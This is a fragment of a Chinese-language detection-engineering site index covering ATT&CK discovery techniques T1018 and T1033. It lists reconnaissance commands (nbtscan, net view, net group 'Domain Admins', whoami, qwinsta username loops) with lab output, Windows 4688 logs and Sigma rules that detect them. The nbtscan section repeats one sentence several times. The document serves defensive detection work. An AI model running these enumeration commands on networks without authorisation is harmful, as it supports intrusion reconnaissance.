u5de5\u5177\u4e2d\u5b58\u5728\u7c7b\u4f3c\u7684\u529f\u80fd\u6765\u53ef\u4ee5\u5b9e\u73b0\u6b64\u76ee\u7684\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u53ef\u7528\u7684\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Ping\u6216net view\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u4e3b\u673a\u6587\u4ef6\uff08\u4f8b\u5982\uff1aC:\\Windows\\System32\\Drivers\\etc\\hosts\u6216/etc/hosts\uff09\u6765\u53d1\u73b0\u4e3b\u673a\u540d\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684IP\u5730\u5740\u7684\u6620\u5c04\u3002</p> <p>\u8be5bonjour\u534f\u8bae\u7279\u5b9a\u4e8emacOS\uff0c\u7528\u4e8e\u5728\u540c\u4e00\u5e7f\u64ad\u57df\u4e2d\u53d1\u73b0\u5176\u4ed6\u57fa\u4e8eMac\u7684\u7cfb\u7edf\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Nbtscan.exe\u662f\u4e00\u6b3e\u7528\u4e8e\u626b\u63cfWindows\u7f51\u7edc\u4e0aNetBIOS\u540d\u5b57\u4fe1\u606f\u7684\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5bf9\u7ed9\u51fa\u8303\u56f4\u5185\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\u53d1\u9001NetBIOS\u72b6\u6001\u67e5\u8be2\uff0c\u5e76\u4e14\u4ee5\u6613\u8bfb\u7684\u8868\u683c\u5217\u51fa\u63a5\u6536\u5230\u7684\u4fe1\u606f\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u54cd\u5e94\u7684\u4e3b\u673a\uff0cNBTScan\u5217\u51fa\u5b83\u7684IP\u5730\u5740\u3001NetBIOS\u8ba1\u7b97\u673a\u540d\u3001\u767b\u5f55\u7528\u6237\u540d\u548cMAC\u5730\u5740\u3002\u4f46\u53ea\u80fd\u7528\u4e8e\u5c40\u57df\u7f51,NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002\u4f46\u53ea\u80fd\u7528\u4e8e\u5c40\u57df\u7f51,NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002\u603b\u4e4b\uff0cNBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\12306br0\\Desktop\\test&gt;nbtscan-1.0.35.exe 10.211.55.1/24\n10.211.55.2     \\MACBOOKPRO-3EAA\n*timeout (normal end of scan)\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>4688\uff0c\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x507DC\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x135c\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Users\\12306br0\\Desktop\\test\\nbtscan-1.0.35.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xc68\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: nbtscan-1.0.35.exe  10.211.55.1/24\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4bnbtscan\u6d3b\u52a8\ndescription: windows server 2016\u3001\u672c\u68c0\u6d4b\u89c4\u5219\u53c2\u8003Microsoft\u5a01\u80c1\u9632\u62a4\u56e2\u961f\u53d1\u5e03\u7684Operation Soft Cell\u5a01\u80c1\u5206\u6790\u62a5\u544a\uff0cSoft Cell\u884c\u52a8\u662f\u4e00\u7cfb\u5217\u9488\u5bf9\u5168\u7403\u7535\u4fe1\u63d0\u4f9b\u5546\u7684\u7528\u6237\u547c\u53eb\u65e5\u5fd7\u7684\u8fd0\u52a8\u3002\u8fd9\u4e9b\u653b\u51fb\u6700\u65e9\u53ef\u4ee5\u8ffd\u6eaf\u52302012\u5e74\u3002nbtscan.exe\u662f\u4e00\u79cd\u5408\u6cd5\u7684MS-DOS\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u7528\u4e8e\u53d1\u73b0\u672c\u5730\u6216\u8fdc\u7a0bTCP/IP\u7f51\u7edc\u4e0a\u7684\u4efb\u4f55NETBIOS\u540d\u79f0\u670d\u52a1\u5668\u3002\nreferences: https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Discovery/detect-nbtscan-activity.md\ntags: T1018\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Newprocessname: '*nbtscan*.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u57fa\u4e8e\u975e\u7cfb\u7edf\u81ea\u5e26\u8fdb\u7a0b\u540d\u79f0\u7684\u68c0\u6d4b\u65b9\u6cd5\u59cb\u7ec8\u662f\u4e0d\u592a\u9760\u8c31\u7684\uff0c\u5f53\u653b\u51fb\u8005\u4fee\u6539\u8fdb\u7a0b\u540d\u79f0\u540e\uff0c\u5c31\u65e0\u6cd5\u901a\u8fc7\u8fdb\u7a0b\u540d\u79f0\u8fdb\u884c\u68c0\u6d4b\uff1b\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72sysmon\uff0c\u5229\u7528\u8fdb\u7a0bhash\u503c\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1018</p> <p>https://attack.mitre.org/techniques/T1018/</p> <p>\u68c0\u6d4bnbtscan\u6d3b\u52a8</p> <p>https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Discovery/detect-nbtscan-activity.md</p> <p>Nbtscan\u4e0b\u8f7d</p> <p>http://unixwiz.net/tools/nbtscan.html</p> <p>\u8f6f\u8702\u7a9d\u884c\u52a8:\u9488\u5bf9\u7535\u4fe1\u63d0\u4f9b\u5546\u7684\u5168\u7403\u8fd0\u52a8</p> <p>https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/","title":"T1018-win-\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8bd5\u56fe\u901a\u8fc7IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u6216\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u903b\u8f91\u6807\u8bc6\u7b26\u83b7\u53d6\u5176\u4ed6\u7cfb\u7edf\u7684\u5217\u8868\uff0c\u8be5\u5217\u8868\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u7cfb\u7edf\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002\u5728\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u53ef\u4ee5\u5b58\u5728\u529f\u80fd\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u53ef\u7528\u7684\u5b9e\u7528\u5de5\u5177\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u4e3b\u673a\u6587\u4ef6\u6765\u53d1\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4e3b\u673a\u540d\u5230IP\u5730\u5740\u7684\u6620\u5c04\u3002</p> <p>windows</p> <p>\u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u5de5\u5177\u548c\u547d\u4ee4\u793a\u4f8b\u5305\u62ec\u4f7f\u7528net\u7684\u201cping\u201d\u6216\u201cnet view\u201d\u3002\u53ef\u4ee5\u67e5\u770b C:\\Windows\\System32\\Drivers\\etc\\hosts\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002</p> <p>MacOS</p> <p>\u7279\u5b9a\u4e8eMac\uff0c\u5728\u540c\u4e00\u5e7f\u64ad\u57df\u5185\u53d1\u73b0\u5176\u4ed6\u57fa\u4e8eMac\u7684\u7cfb\u7edf\u7684bonjour\u534f\u8bae\u3002\u8bf8\u5982\u201cping\u201d\u7b49\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6536\u96c6\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b/ETC/HOST\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002</p> <p>Linux</p> <p>\u8bf8\u5982\u201cping\u201d\u7b49\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6536\u96c6\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b/ETC/HOST\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002</p> <p>\u4e91</p> <p>\u5728\u4e91\u73af\u5883\u4e2d\uff0c\u4e0a\u8ff0\u6280\u672f\u53ef\u7528\u4e8e\u6839\u636e\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u53d1\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u3002\u6b64\u5916\uff0c\u4e91\u73af\u5883\u901a\u5e38\u4e3aapi\u63d0\u4f9b\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u548c\u670d\u52a1\u7684\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u4e0b\u6267\u884cnet view\u76f8\u5173\u547d\u4ee4\u53c2\u6570</p> <p>net view\u83b7\u53d6\u5f53\u524d\u7ec4\u7684\u8ba1\u7b97\u673a\u540d(\u4e00\u822cremark\u6709Dc\u53ef\u80fd\u662f\u57df\u63a7)\uff0c\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u65e0\u6cd5\u5355\u72ec\u4f7f\u7528net view\uff1b</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\administrator.0DAY&gt;net view \\\\ICBC.0day.org\n\u5217\u8868\u662f\u7a7a\u7684\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6\u521b\u5efa4688\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\u4ee5\u4e0a\uff09</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows\u6267\u884cnet view\u547d\u4ee4\ndescription: windows server 2016\nreferences: \u6682\u65e0\ntags: T1018\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Newprocessname: 'C:\\windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: net  view *  #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u6839\u636e\u5b50\u7236\u8fdb\u7a0b\u4ee5\u53ca\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4f46\u662f\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u67d0\u4e9b\u547d\u4ee4\u6b63\u5e38\u7ba1\u7406\u5458\u4e5f\u4f1a\u53bb\u7528\uff0c\u6240\u4ee5\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6392\u9664\u8bef\u62a5\u3002</p> <p>\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u4e0e\u5408\u6cd5\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0\u76f8\u5173\u7684\u6b63\u5e38\u3001\u826f\u6027\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u4e0d\u5e38\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1018</p> <p>https://attack.mitre.org/techniques/T1018/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/","title":"T1033-\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#windows","title":"windows","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bc6\u522b\u4e3b\u8981\u7528\u6237\u3001\u5f53\u524d\u767b\u5f55\u7528\u6237\u3001\u901a\u5e38\u4f7f\u7528\u7cfb\u7edf\u7684\u7528\u6237\u96c6\uff0c\u6216\u8005\u7528\u6237\u662f\u5426\u6b63\u5728\u79ef\u6781\u4f7f\u7528\u7cfb\u7edf\u3002\u4ed6\u4eec\u53ef\u4ee5\u8fd9\u6837\u505a\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u68c0\u7d22\u5e10\u6237\u7528\u6237\u540d\u6216\u4f7f\u7528\u51ed\u636e\u8f6c\u50a8\u3002\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u53d1\u73b0\u6280\u672f\u4ee5\u591a\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u4fe1\u606f\uff0c\u56e0\u4e3a\u7528\u6237\u548c\u7528\u6237\u540d\u8be6\u7ec6\u4fe1\u606f\u5728\u6574\u4e2a\u7cfb\u7edf\u4e2d\u90fd\u5f88\u5e38\u89c1\uff0c\u5305\u62ec\u8fd0\u884c\u8fdb\u7a0b\u6240\u6709\u6743\u3001\u6587\u4ef6\u76ee\u5f55\u6240\u6709\u6743\u3001\u4f1a\u8bdd\u4fe1\u606f\u548c\u7cfb\u7edf\u65e5\u5fd7\u3002\u653b\u51fb\u8005\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u6765\u81ea\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0\u7684\u4fe1\u606f\uff0c\u6765\u4f2a\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#macos","title":"MACos","text":"<p>\u5728Mac\u4e0a\uff0c\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u53ef\u4ee5\u4f7f\u7528users\uff0cw\u548cwho\u6765\u8fdb\u884c\u8bc6\u522b\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#linux","title":"linux","text":"<p>\u5728Linux\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528w\u548c\u6807\u8bc6\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237who\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<pre><code>windows\u76f8\u5173\u547d\u4ee4\n- \u67e5\u8be2\u672c\u5730\u7528\u6237\u6743\u9650\uff1awhoami\n- \u67e5\u8be2\u57df\u7528\u6237\uff1adsquery user\u3001net user /domain\n- \u67e5\u8be2\u57df\u7ec4\u6743\u9650\uff1anet group /domain\n- \u67e5\u8be2\u57df\u7ba1\u7406\u5458\uff1anet group \"Domain Admins\" /domain\n- \u67e5\u770b\u5f53\u524d\u8ba1\u7b97\u673a\u540d\uff0c\u5168\u540d\uff0c\u7528\u6237\u540d\uff0c\u7cfb\u7edf\u7248\u672c\uff0c\u5de5\u4f5c\u7ad9\u57df\uff0c\u767b\u9646\u57df\uff1anet config Workstation\n- \u67e5\u770b\u57df\u63a7\u5236\u5668\uff1anet group \"Domain controllers\" \uff08\u591a\u57df\u63a7\u5236\u5668\u7684\u65f6\u5019,\u800c\u4e14\u53ea\u80fd\u7528\u5728\u57df\u63a7\u5236\u5668\u4e0a\uff09\n- \u67e5\u8be2\u6240\u6709\u8ba1\u7b97\u673a\u540d\u79f0\uff1anet group \"Domain Computers\" /domain\uff08\u57df\u63a7\u4e0d\u4f1a\u88ab\u5217\u51fa\uff09\n\nlinux who\u547d\u4ee4\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <p>linux history</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#windows_1","title":"windows\u6d4b\u8bd5","text":"<pre><code>Microsoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Windows\\system32&gt;whoami\nicbc\\administrator\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#linux_1","title":"linux\u6d4b\u8bd5","text":"<pre><code>icbc@icbc:~$ who\nicbc     :0           2019-11-10 18:58 (:0)\nicbc@icbc:~$ w\n 19:03:14 up 5 min,  1 user,  load average: 0.08, 0.51, 0.31\nUSER     TTY      \u6765\u81ea           LOGIN@   IDLE   JCPU   PCPU WHAT\nicbc     :0       :0               18:58   ?xdm?  35.66s  0.02s /usr/lib/gdm3/g\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7 4688</p> <p>linux history\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0\ndescription: windows server 2016/Ubuntu19.04\nreferences: \n        - https://attack.mitre.org/techniques/T1033/\n        - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1033/T1033.md\ntags: T1033\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        CommandLine:\n                - cmd.exe /C whoami\n                - wmic useraccount get /ALL\n                - quser /SERVER:\"#{computer_name}\"\n                - quser\n                - qwinsta.exe /server:#{computer_name}\n                - qwinsta.exe\n                - for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j &gt; usernames.txt\n                - @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j &gt; usernames.txt\n    condition: selection\nlevel: low\n</code></pre> 